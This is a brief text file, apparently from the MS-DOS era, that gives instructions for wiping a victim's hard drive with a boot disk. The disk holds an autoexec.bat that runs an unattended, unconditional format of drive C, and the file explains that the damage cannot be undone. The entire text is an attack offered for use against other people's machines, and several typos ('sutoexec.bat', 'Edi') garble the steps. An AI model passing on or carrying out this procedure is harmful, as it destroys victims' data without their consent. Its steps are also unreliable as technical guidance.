Effect:
 Victims computer is formatted and all data
 replaced with '0,' so that data recovery
 programs are useless to repair the damage.

Procedure:
 Using MS-DOS's Format.com, create a boot disk

  format.com a: /s

 Copy format.com onto the newly created disk.

  copy format.com a:

 Using Edi, create a batch fie with the foowing data,
 and save it onto the boot disk as sutoexec.bat.

  echo off
  cd a:
  format c: /autotest /u


How it works:
 Boot disk is inserted in victims computer.  The next
 time the computer boots, if the disk remains in, the
 boot disk is loaded.  The autoexec.bat file, and the
 commands contained within it are executed.  The
 first two commands prepare for the third.  The
 command will format the specified drive letter, in this
 case, drive C.  the /Autotest parameter causes the
 command to be performed without user intervention.
 the /U command calls for an unconditional format,
 which replaces all data with '0's, so recovery is
 impossible.
